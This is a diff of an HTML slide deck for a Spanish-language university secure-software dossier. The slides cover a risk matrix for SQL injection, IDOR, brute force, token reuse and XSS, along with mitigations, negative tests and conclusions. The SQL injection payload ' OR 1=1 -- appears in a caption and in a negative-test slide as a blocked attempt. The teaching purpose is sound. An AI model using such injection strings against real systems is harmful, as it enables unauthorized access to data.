+  <div class="text-center text-xs text-slate-400">UNSAAC • Ingeniería de Software II • Mini Dossier de Software Seguro</div>
 </div>
 
-<!-- ══════════════════════════════════════════════════════════
-     SLIDE 20: EVIDENCIAS - LISTADO Y BÚSQUEDA SEGURA
-═══════════════════════════════════════════════════════════ -->
-<div class="slide">
-  <div class="slide-header">
-    <div class="flex items-center gap-3">
-      <span class="text-2xl">🔍</span>
-      <h2 class="text-xl font-bold tracking-wide">5.4 Evidencias — Listado y Búsqueda Anti-Inyección</h2>
-    </div>
-    <span class="text-sm bg-white/20 px-3 py-1 rounded-full font-semibold">Capturas del Software</span>
+<!-- =========================================================================
+     SLIDE 5: 3.- MATRIZ DE RIESGOS (Estilo Infografía Imagen 6)
+========================================================================== -->
+<div class="slide bg-white p-8 flex flex-col justify-between">
+  <div>
+    <h1 class="text-3xl font-black text-[#0f2b48] text-center tracking-tight leading-snug">
+      MATRIZ DE RIESGOS:<br/>GESTIÓN DE TAREAS API
+    </h1>
+    <div class="w-full h-1 bg-red-600 mt-3 mb-5"></div>
   </div>
 
-  <div class="flex-1 px-16 py-6 flex flex-col justify-center max-w-7xl mx-auto w-full">
-    <div class="grid grid-cols-2 gap-8 items-center">
-      <div class="bg-white rounded-2xl p-4 shadow-md border border-slate-200">
-        <img src="CAPTURAS DE PANTALLA DEL SOFTWARE/lista de tareas.png" alt="Lista de Tareas" class="w-full h-72 object-contain rounded-xl bg-slate-50 border border-slate-100" />
-        <div class="mt-3 text-center">
-          <p class="font-bold text-slate-800 text-sm">Listado Filtrado por Propietario</p>
-          <p class="text-xs text-slate-500">Cada usuario solo puede listar las tareas vinculadas a su propio identificador.</p>
-        </div>
+  <!-- Filas horizontales con ID, descripción y cuadrícula de calor -->
+  <div class="space-y-2.5 px-8 my-auto">
+    <!-- R-01 -->
+    <div class="flex items-center shadow-md rounded-xl overflow-hidden">
+      <div class="w-24 bg-red-600 text-white font-black text-2xl flex items-center justify-center py-3">R-01</div>
+      <div class="flex-1 matrix-card text-white px-5 py-2.5">
+        <h4 class="font-bold text-sm">Inyección SQL en búsqueda:</h4>
+        <p class="text-xs text-slate-300">Riesgo Extremo / Crítico (Score: 20) — Mitigar con Prepared Statements (?)</p>
       </div>
-
-      <div class="bg-white rounded-2xl p-4 shadow-md border border-slate-200">
-        <img src="CAPTURAS DE PANTALLA DEL SOFTWARE/buscar tareas.png" alt="Buscar Tareas" class="w-full h-72 object-contain rounded-xl bg-slate-50 border border-slate-100" />
-        <div class="mt-3 text-center">
-          <p class="font-bold text-slate-800 text-sm">Búsqueda Segura con Prepared Statements</p>
-          <p class="text-xs text-slate-500">Consultas parametrizadas que neutralizan payloads de inyección SQL como ' OR 1=1 --.</p>
-        </div>
+      <div class="flex h-full">
+        <span class="w-12 bg-orange-500 border border-white"></span>
+        <span class="w-12 bg-orange-600 border border-white"></span>
+        <span class="w-12 bg-red-600 border border-white"></span>
+        <span class="w-12 bg-red-700 border border-white"></span>
       </div>
     </div>
+
+    <!-- R-02 -->
+    <div class="flex items-center shadow-md rounded-xl overflow-hidden">
+      <div class="w-24 bg-orange-600 text-white font-black text-2xl flex items-center justify-center py-3">R-02</div>
+      <div class="flex-1 matrix-card text-white px-5 py-2.5">
+        <h4 class="font-bold text-sm">Acceso a tareas ajenas (IDOR):</h4>
+        <p class="text-xs text-slate-300">Riesgo Crítico (Score: 16) — Validar sesión activa y owner_id == user_id</p>
+      </div>
+      <div class="flex h-full">
+        <span class="w-12 bg-amber-400 border border-white"></span>
+        <span class="w-12 bg-orange-500 border border-white"></span>
+        <span class="w-12 bg-orange-600 border border-white"></span>
+        <span class="w-12 bg-red-600 border border-white"></span>
+      </div>
+    </div>
+
+    <!-- R-03 -->
+    <div class="flex items-center shadow-md rounded-xl overflow-hidden">
+      <div class="w-24 bg-orange-600 text-white font-black text-2xl flex items-center justify-center py-3">R-03</div>
+      <div class="flex-1 matrix-card text-white px-5 py-2.5">
+        <h4 class="font-bold text-sm">Fuerza bruta en Login:</h4>
+        <p class="text-xs text-slate-300">Riesgo Crítico (Score: 16) — Rate Limiting progresivo (IP y cuenta, 30s/180s)</p>
+      </div>
+      <div class="flex h-full">
+        <span class="w-12 bg-amber-400 border border-white"></span>
+        <span class="w-12 bg-orange-500 border border-white"></span>
+        <span class="w-12 bg-orange-600 border border-white"></span>
+        <span class="w-12 bg-red-600 border border-white"></span>
+      </div>
+    </div>
+
+    <!-- R-04 -->
+    <div class="flex items-center shadow-md rounded-xl overflow-hidden">
+      <div class="w-24 bg-orange-500 text-white font-black text-2xl flex items-center justify-center py-3">R-04</div>
+      <div class="flex-1 matrix-card text-white px-5 py-2.5">
+        <h4 class="font-bold text-sm">Reutilización token de reseteo:</h4>
+        <p class="text-xs text-slate-300">Riesgo Alto (Score: 15) — Token criptográfico SHA-256 de un solo uso (1h)</p>
+      </div>
+      <div class="flex h-full">
+        <span class="w-12 bg-amber-300 border border-white"></span>
+        <span class="w-12 bg-amber-400 border border-white"></span>
+        <span class="w-12 bg-orange-500 border border-white"></span>
+        <span class="w-12 bg-orange-600 border border-white"></span>
+      </div>
+    </div>
+
+    <!-- R-05 -->
+    <div class="flex items-center shadow-md rounded-xl overflow-hidden">
+      <div class="w-24 bg-amber-400 text-slate-900 font-black text-2xl flex items-center justify-center py-3">R-05</div>
+      <div class="flex-1 matrix-card text-white px-5 py-2.5">
+        <h4 class="font-bold text-sm">Inyección XSS en comentarios:</h4>
+        <p class="text-xs text-slate-300">Riesgo Medio (Score: 9) — Sanitización de salidas con markupsafe.escape()</p>
+      </div>
+      <div class="flex h-full">
+        <span class="w-12 bg-emerald-400 border border-white"></span>
+        <span class="w-12 bg-amber-300 border border-white"></span>
+        <span class="w-12 bg-amber-400 border border-white"></span>
+        <span class="w-12 bg-amber-500 border border-white"></span>
+      </div>
+    </div>
   </div>
 
-  <div class="slide-footer">
-    <span>Mini Dossier de Software Seguro • UNSAAC</span>
-    <span>Slide 20 / 24</span>
-  </div>
+  <div class="text-center text-xs text-slate-400">UNSAAC • Evaluación Cuantitativa STRIDE • Mini Dossier de Software Seguro</div>
 </div>
 
-<!-- ══════════════════════════════════════════════════════════
-     SLIDE 21: EVIDENCIAS - EDICIÓN Y ELIMINACIÓN ANTI-IDOR
-═══════════════════════════════════════════════════════════ -->
-<div class="slide">
-  <div class="slide-header">
-    <div class="flex items-center gap-3">
-      <span class="text-2xl">🗑️</span>
-      <h2 class="text-xl font-bold tracking-wide">5.5 Evidencias — Edición y Eliminación Controlada (Anti-IDOR)</h2>
-    </div>
-    <span class="text-sm bg-white/20 px-3 py-1 rounded-full font-semibold">Capturas del Software</span>
+<!-- =========================================================================
+     SLIDE 6: 4.- PROPUESTA DE CÓDIGO SEGURO (Estilo Imagen 7)
+========================================================================== -->
+<div class="slide bg-white p-8 flex flex-col justify-between">
+  <div>
+    <h1 class="text-3xl font-black text-[#0f2b48] text-center tracking-tight leading-snug">
+      PROPUESTA DE<br/>CÓDIGO SEGURO
+    </h1>
+    <div class="w-full h-1 bg-red-600 mt-3 mb-6"></div>
   </div>
 
-  <div class="flex-1 px-16 py-6 flex flex-col justify-center max-w-7xl mx-auto w-full">
-    <div class="grid grid-cols-2 gap-8 items-center">
-      <div class="bg-white rounded-2xl p-4 shadow-md border border-slate-200">
-        <img src="CAPTURAS DE PANTALLA DEL SOFTWARE/editar una tarea creada.png" alt="Editar Tarea" class="w-full h-72 object-contain rounded-xl bg-slate-50 border border-slate-100" />
-        <div class="mt-3 text-center">
-          <p class="font-bold text-slate-800 text-sm">Edición con Verificación de Pertenencia</p>
-          <p class="text-xs text-slate-500">El modal de edición comprueba el owner_id antes de despachar el PUT.</p>
-        </div>
+  <!-- Dos bloques grandes superiores: Antes vs Después -->
+  <div class="grid grid-cols-2 gap-8 px-10 my-auto">
+    <!-- Bloque Rojo: ANTES -->
+    <div class="bg-red-600 rounded-2xl p-6 text-white text-center shadow-lg relative flex flex-col items-center justify-center">
+      <div class="w-12 h-12 bg-white rounded-full flex items-center justify-center text-red-600 font-black text-2xl mb-3 shadow">
+        ⚠️
       </div>
-
-      <div class="bg-white rounded-2xl p-4 shadow-md border border-slate-200">
-        <img src="CAPTURAS DE PANTALLA DEL SOFTWARE/eliminar una tarea.png" alt="Eliminar Tarea" class="w-full h-72 object-contain rounded-xl bg-slate-50 border border-slate-100" />
-        <div class="mt-3 text-center">
-          <p class="font-bold text-slate-800 text-sm">Borrado Protegido Contra IDOR</p>
-          <p class="text-xs text-slate-500">Si un usuario intenta eliminar una tarea ajena, el backend aborta con HTTP 403.</p>
-        </div>
-      </div>
-    </div>
-  </div>
-
-  <div class="slide-footer">
-    <span>Mini Dossier de Software Seguro • UNSAAC</span>
-    <span>Slide 21 / 24</span>
-  </div>
-</div>
-
-<!-- ══════════════════════════════════════════════════════════
-     SLIDE 22: EVIDENCIAS - ROLES RBAC
-═══════════════════════════════════════════════════════════ -->
-<div class="slide">
-  <div class="slide-header">
-    <div class="flex items-center gap-3">
-      <span class="text-2xl">👥</span>
-      <h2 class="text-xl font-bold tracking-wide">5.6 Evidencias — Control de Acceso Basado en Roles (RBAC)</h2>
-    </div>
-    <span class="text-sm bg-white/20 px-3 py-1 rounded-full font-semibold">Capturas del Software</span>
-  </div>
-
-  <div class="flex-1 px-16 py-6 flex flex-col justify-center max-w-7xl mx-auto w-full">
-    <div class="grid grid-cols-2 gap-8 items-center">
-      <div class="bg-white rounded-2xl p-4 shadow-md border border-slate-200">
-        <img src="CAPTURAS DE PANTALLA DEL SOFTWARE/perfil del admin.png" alt="Perfil Admin" class="w-full h-72 object-contain rounded-xl bg-slate-50 border border-slate-100" />
-        <div class="mt-3 text-center">
-          <p class="font-bold text-slate-800 text-sm">Vista del Perfil Administrador</p>
-          <p class="text-xs text-slate-500">Acceso a métricas globales y administración avanzada del sistema.</p>
-        </div>
-      </div>
-
-      <div class="bg-white rounded-2xl p-4 shadow-md border border-slate-200">
-        <img src="CAPTURAS DE PANTALLA DEL SOFTWARE/perfil de docente.png" alt="Perfil Docente" class="w-full h-72 object-contain rounded-xl bg-slate-50 border border-slate-100" />
-        <div class="mt-3 text-center">
-          <p class="font-bold text-slate-800 text-sm">Vista del Perfil Docente</p>
-          <p class="text-xs text-slate-500">Privilegios específicos para supervisión académica y asignación de tareas.</p>
-        </div>
-      </div>
-    </div>
-  </div>
-
-  <div class="slide-footer">
-    <span>Mini Dossier de Software Seguro • UNSAAC</span>
-    <span>Slide 22 / 24</span>
-  </div>
-</div>
-
-<!-- ══════════════════════════════════════════════════════════
-     SLIDE 23: EVIDENCIAS - DOCUMENTACIÓN SWAGGER / APIS
-═══════════════════════════════════════════════════════════ -->
-<div class="slide">
-  <div class="slide-header">
-    <div class="flex items-center gap-3">
-      <span class="text-2xl">📑</span>
-      <h2 class="text-xl font-bold tracking-wide">5.7 Evidencias — Documentación Interactiva de la API (/docs)</h2>
-    </div>
-    <span class="text-sm bg-white/20 px-3 py-1 rounded-full font-semibold">FastAPI OpenAPI / Swagger</span>
-  </div>
-
-  <div class="flex-1 px-16 py-6 flex flex-col justify-center max-w-7xl mx-auto w-full">
-    <div class="grid grid-cols-3 gap-6">
-      <div class="bg-white rounded-2xl p-4 shadow-md border border-slate-200">
-        <img src="CAPTURAS DE PANTALLA DEL SOFTWARE/APIs del software 1.png" alt="API Docs 1" class="w-full h-60 object-contain rounded-xl bg-slate-50 border border-slate-100" />
-        <p class="font-bold text-slate-800 text-xs text-center mt-2.5">Swagger UI — Vista General</p>
-        <p class="text-[0.7rem] text-slate-500 text-center">Esquema OpenAPI 3.0 con definición de modelos de datos.</p>
-      </div>
-
-      <div class="bg-white rounded-2xl p-4 shadow-md border border-slate-200">
-        <img src="CAPTURAS DE PANTALLA DEL SOFTWARE/APIs del software 2.png" alt="API Docs 2" class="w-full h-60 object-contain rounded-xl bg-slate-50 border border-slate-100" />
-        <p class="font-bold text-slate-800 text-xs text-center mt-2.5">Endpoints de Autenticación</p>
-        <p class="text-[0.7rem] text-slate-500 text-center">Rutas /register, /login, /logout y /reset-password.</p>
-      </div>
-
-      <div class="bg-white rounded-2xl p-4 shadow-md border border-slate-200">
-        <img src="CAPTURAS DE PANTALLA DEL SOFTWARE/APIs del software 3.png" alt="API Docs 3" class="w-full h-60 object-contain rounded-xl bg-slate-50 border border-slate-100" />
-        <p class="font-bold text-slate-800 text-xs text-center mt-2.5">Endpoints CRUD de Tareas</p>
-        <p class="text-[0.7rem] text-slate-500 text-center">Operaciones protegidas mediante Bearer Token OAuth2.</p>
-      </div>
-    </div>
-  </div>
-
-  <div class="slide-footer">
-    <span>Mini Dossier de Software Seguro • UNSAAC</span>
-    <span>Slide 23 / 24</span>
-  </div>
-</div>
-
-<!-- ══════════════════════════════════════════════════════════
-     SLIDE 24: CIERRE Y ENLACES OFICIALES
-═══════════════════════════════════════════════════════════ -->
-<div class="slide gradient-hero text-white">
-  <div class="flex-1 px-16 py-10 flex flex-col justify-center max-w-7xl mx-auto w-full">
-    <div class="text-center mb-8">
-      <span class="inline-block bg-blue-500/20 text-blue-300 border border-blue-400/30 text-xs px-3 py-1 rounded-full font-bold uppercase tracking-wider mb-3">
-        Entrega Final • Tarea 4.1
-      </span>
-      <h2 class="text-4xl font-black mb-3">Mini DOSSIER de Software Seguro Concluido</h2>
-      <p class="text-slate-300 text-base max-w-2xl mx-auto">
-        Todos los recursos, código fuente, suites de prueba e informes SAST se encuentran disponibles para revisión en los canales oficiales:
+      <h3 class="text-xl font-black tracking-wide uppercase mb-2">ANTES - CÓDIGO VULNERABLE:</h3>
+      <p class="text-sm font-medium leading-relaxed">
+        Concatenación SQL directa en búsqueda e IDOR sin validar usuario.<br/>
+        <span class="text-xs bg-red-700/60 px-2 py-0.5 rounded font-mono mt-1 inline-block">Bandit B608 (CWE-89) • Pylint W0612 (CWE-284)</span>
       </p>
     </div>
 
-    <div class="grid grid-cols-3 gap-6 max-w-5xl mx-auto w-full mb-8">
-      <div class="bg-white/5 border border-white/10 rounded-2xl p-5 backdrop-blur-sm text-center">
-        <div class="text-3xl mb-2">🐙</div>
-        <p class="text-xs uppercase font-bold text-blue-300 tracking-wider mb-1">Repositorio GitHub</p>
-        <p class="text-xs font-mono text-emerald-300 break-all">https://github.com/GamoLG/PRACTICA-4-INGENIERIA-DE-SOFTWARE-II</p>
+    <!-- Bloque Verde: DESPUÉS -->
+    <div class="bg-emerald-600 rounded-2xl p-6 text-white text-center shadow-lg relative flex flex-col items-center justify-center">
+      <div class="w-12 h-12 bg-white rounded-full flex items-center justify-center text-emerald-600 font-black text-2xl mb-3 shadow">
+        🛡️
       </div>
-
-      <div class="bg-white/5 border border-white/10 rounded-2xl p-5 backdrop-blur-sm text-center">
-        <div class="text-3xl mb-2">☁️</div>
-        <p class="text-xs uppercase font-bold text-blue-300 tracking-wider mb-1">Demo en Producción</p>
-        <p class="text-xs font-mono text-sky-300 break-all">https://practica-4-ingenieria-de-software-ii.onrender.com</p>
-      </div>
-
-      <div class="bg-white/5 border border-white/10 rounded-2xl p-5 backdrop-blur-sm text-center">
-        <div class="text-3xl mb-2">📖</div>
-        <p class="text-xs uppercase font-bold text-blue-300 tracking-wider mb-1">Documentación Swagger</p>
-        <p class="text-xs font-mono text-indigo-300 break-all">https://practica-4-ingenieria-de-software-ii.onrender.com/docs</p>
-      </div>
+      <h3 class="text-xl font-black tracking-wide uppercase mb-2">DESPUÉS - CÓDIGO SEGURO:</h3>
+      <p class="text-sm font-medium leading-relaxed">
+        Prepared Statements con '?', verificación obligatoria de <code class="bg-emerald-700/60 px-1 rounded font-mono">owner_id == user_id</code> (HTTP 403) y escape de caracteres HTML.
+      </p>
     </div>
 
-    <div class="text-center text-slate-400 text-xs">
-      <p class="font-semibold text-slate-300">Universidad Nacional de San Antonio Abad del Cusco (UNSAAC)</p>
-      <p class="mt-1">Ingeniería de Software II — Docente: Ing. Alex Fernando Huillca Huaman | Noviembre 2026</p>
+    <!-- Bloque Oscuro Inferior: PRUEBA NEGATIVA 1 -->
+    <div class="bg-[#142337] rounded-xl p-4 text-center text-white shadow-md">
+      <h4 class="font-black text-sm uppercase tracking-wider text-slate-200">PRUEBA NEGATIVA 1:</h4>
+      <p class="text-xs text-slate-300 mt-1">Intento SQLi bloqueado (' OR 1=1 --) retorna lista vacía [] con HTTP 200</p>
+    </div>
+
+    <!-- Bloque Oscuro Inferior: PRUEBA NEGATIVA 2 -->
+    <div class="bg-[#142337] rounded-xl p-4 text-center text-white shadow-md">
+      <h4 class="font-black text-sm uppercase tracking-wider text-slate-200">PRUEBA NEGATIVA 2:</h4>
+      <p class="text-xs text-slate-300 mt-1">Intento IDOR bloqueado (DELETE ajeno) con código estricto HTTP 403 Forbidden</p>
     </div>
   </div>
 
-  <div class="slide-footer bg-slate-950/80 border-slate-800 text-slate-400">
-    <span>UNSAAC • Mini Dossier de Software Seguro</span>
-    <span>Slide 24 / 24</span>
+  <div class="text-center text-xs text-slate-400">UNSAAC • Testing Negativo Automatizado (pytest 100% PASS) • Mini Dossier de Software Seguro</div>
+</div>
+
+<!-- =========================================================================
+     SLIDE 7: 5.- EVIDENCIAS (LOGIN Y CRUD TAREAS)
+========================================================================== -->
+<div class="slide bg-white p-6 flex flex-col justify-between">
+  <div>
+    <h1 class="text-3xl font-black text-[#0f2b48] text-center tracking-tight leading-snug">EVIDENCIAS</h1>
+    <div class="grid grid-cols-2 text-center text-lg font-bold text-[#0f2b48] mt-2 border-b-2 border-red-600 pb-1">
+      <span>LOGIN Y ACCESO SEGURO</span>
+      <span>CRUD DE TAREAS Y VALIDACIÓN</span>
+    </div>
   </div>
+
+  <!-- Grilla de 4 capturas -->
+  <div class="grid grid-cols-2 gap-6 my-auto px-6">
+    <div class="border rounded-xl p-2 bg-slate-50 shadow-sm flex flex-col items-center">
+      <img src="CAPTURAS DE PANTALLA DEL SOFTWARE/LOGIN.png" alt="Login" class="h-44 object-contain rounded" />
+      <p class="text-xs font-bold text-slate-700 mt-2">Pantalla Principal de Login (JWT & RBAC)</p>
+    </div>
+
+    <div class="border rounded-xl p-2 bg-slate-50 shadow-sm flex flex-col items-center">
+      <img src="CAPTURAS DE PANTALLA DEL SOFTWARE/creacion de tarea.png" alt="Crear Tarea" class="h-44 object-contain rounded" />
+      <p class="text-xs font-bold text-slate-700 mt-2">Creación Segura de Tarea (Asignación Automática de owner_id)</p>
+    </div>
+
+    <div class="border rounded-xl p-2 bg-slate-50 shadow-sm flex flex-col items-center">
+      <img src="CAPTURAS DE PANTALLA DEL SOFTWARE/seguridad en el inicio de sesion.png" alt="Seguridad Login" class="h-44 object-contain rounded" />
+      <p class="text-xs font-bold text-slate-700 mt-2">Controles Activos de Seguridad y Rate Limiting</p>
+    </div>
+
+    <div class="border rounded-xl p-2 bg-slate-50 shadow-sm flex flex-col items-center">
+      <img src="CAPTURAS DE PANTALLA DEL SOFTWARE/lista de tareas.png" alt="Lista Tareas" class="h-44 object-contain rounded" />
+      <p class="text-xs font-bold text-slate-700 mt-2">Listado Filtrado por Propietario (Aislamiento Total)</p>
+    </div>
+  </div>
+
+  <div class="text-center text-xs text-slate-400">UNSAAC • Capturas del Software en Producción • Mini Dossier de Software Seguro</div>
+</div>
+
+<!-- =========================================================================
+     SLIDE 8: 5.- EVIDENCIAS (ANTI-IDOR Y SWAGGER)
+========================================================================== -->
+<div class="slide bg-white p-6 flex flex-col justify-between">
+  <div>
+    <h1 class="text-3xl font-black text-[#0f2b48] text-center tracking-tight leading-snug">EVIDENCIAS</h1>
+    <div class="grid grid-cols-2 text-center text-lg font-bold text-[#0f2b48] mt-2 border-b-2 border-red-600 pb-1">
+      <span>PROTECCIÓN ANTI-IDOR & BÚSQUEDA</span>
+      <span>ROLES RBAC & DOCUMENTACIÓN SWAGGER</span>
+    </div>
+  </div>
+
+  <!-- Grilla de 4 capturas -->
+  <div class="grid grid-cols-2 gap-6 my-auto px-6">
+    <div class="border rounded-xl p-2 bg-slate-50 shadow-sm flex flex-col items-center">
+      <img src="CAPTURAS DE PANTALLA DEL SOFTWARE/eliminar una tarea.png" alt="Eliminar Tarea" class="h-44 object-contain rounded" />
+      <p class="text-xs font-bold text-slate-700 mt-2">Borrado Controlado: Intentos Ajenos Abortan con HTTP 403</p>
+    </div>
+
+    <div class="border rounded-xl p-2 bg-slate-50 shadow-sm flex flex-col items-center">
+      <img src="CAPTURAS DE PANTALLA DEL SOFTWARE/perfil del admin.png" alt="Perfil Admin" class="h-44 object-contain rounded" />
+      <p class="text-xs font-bold text-slate-700 mt-2">Panel del Administrador con Métricas Globales</p>
+    </div>
+
+    <div class="border rounded-xl p-2 bg-slate-50 shadow-sm flex flex-col items-center">
+      <img src="CAPTURAS DE PANTALLA DEL SOFTWARE/buscar tareas.png" alt="Buscar Tareas" class="h-44 object-contain rounded" />
+      <p class="text-xs font-bold text-slate-700 mt-2">Búsqueda con Prepared Statements Inmune a SQLi</p>
+    </div>
+
+    <div class="border rounded-xl p-2 bg-slate-50 shadow-sm flex flex-col items-center">
+      <img src="CAPTURAS DE PANTALLA DEL SOFTWARE/APIs del software 1.png" alt="Swagger Docs" class="h-44 object-contain rounded" />
+      <p class="text-xs font-bold text-slate-700 mt-2">Documentación Interactiva FastAPI OpenAPI 3.0 (/docs)</p>
+    </div>
+  </div>
+
+  <div class="text-center text-xs text-slate-400">UNSAAC • Capturas del Software en Producción • Mini Dossier de Software Seguro</div>
+</div>
+
+<!-- =========================================================================
+     SLIDE 9: CONCLUSIONES (Estilo Imagen 8 de la plantilla)
+========================================================================== -->
+<div class="slide bg-white p-8 flex flex-col justify-between">
+  <div>
+    <h1 class="text-3xl font-black text-[#0f2b48] text-center tracking-tight leading-snug">CONCLUSIONES</h1>
+    <div class="w-full h-1 bg-red-600 mt-3 mb-6"></div>
+  </div>
+
+  <!-- 4 Tarjetas de conclusiones ejecutivas -->
+  <div class="space-y-4 px-8 my-auto">
+    <div class="border-2 border-[#0f2b48] rounded-2xl p-4 bg-slate-50 shadow-sm">
+      <h3 class="font-bold text-[#0f2b48] text-base mb-1">1. SEGURIDAD DESDE EL DISEÑO (SHIFT-LEFT):</h3>
+      <p class="text-xs text-slate-700 leading-relaxed">
+        La aplicación formal del modelado de amenazas STRIDE y la definición de DTOs en Pydantic con <code class="font-mono bg-white px-1 rounded">extra='forbid'</code> permitieron anticipar y erradicar vulnerabilidades críticas como SQLi e IDOR antes de escribir código, reduciendo drásticamente los costos de remediación.
+      </p>
+    </div>
+
+    <div class="border-2 border-[#0f2b48] rounded-2xl p-4 bg-slate-50 shadow-sm">
+      <h3 class="font-bold text-[#0f2b48] text-base mb-1">2. EFECTIVIDAD DEL ANÁLISIS ESTÁTICO (SAST):</h3>
+      <p class="text-xs text-slate-700 leading-relaxed">
+        El uso temprano de Bandit y Pylint aportó objetividad técnica al detectar la variable <code class="font-mono bg-white px-1 rounded">user_id_session</code> no utilizada (W0612) en <code class="font-mono bg-white px-1 rounded">app_vulnerable.py</code>, transformando un fallo de Broken Access Control en un control estricto a nivel de fila verificado con 0 alertas en <code class="font-mono bg-white px-1 rounded">app_segura.py</code>.
+      </p>
+    </div>
+
+    <div class="border-2 border-[#0f2b48] rounded-2xl p-4 bg-slate-50 shadow-sm">
+      <h3 class="font-bold text-[#0f2b48] text-base mb-1">3. TESTING NEGATIVO COMO SALVAGUARDA TÉCNICA:</h3>
+      <p class="text-xs text-slate-700 leading-relaxed">
+        Evaluar únicamente el "happy path" es insuficiente en software seguro. La batería de 19 pruebas de penetración automatizadas (pytest) inyectando payloads maliciosos reales garantiza que la lógica de negocio resista ataques sin degradar su integridad.
+      </p>
+    </div>
+
+    <div class="border-2 border-[#0f2b48] rounded-2xl p-4 bg-slate-50 shadow-sm">
+      <h3 class="font-bold text-[#0f2b48] text-base mb-1">4. HARDENING Y OBSERVABILIDAD EN PRODUCCIÓN:</h3>
+      <p class="text-xs text-slate-700 leading-relaxed">
+        La combinación de HTTPS forzado en Render, middleware de cabeceras de seguridad (HSTS, CSP, X-Frame-Options), CORS restrictivo y bitácora estructurada en <code class="font-mono bg-white px-1 rounded">audit.log</code> consolida una arquitectura defendible y trazable que cumple con el OWASP Top 10.
+      </p>
+    </div>
+  </div>
+
+  <div class="text-center text-xs text-slate-400">UNSAAC • Escuela Profesional de Ingeniería Informática y de Sistemas • Noviembre 2026</div>
 </div>
 
 </body>
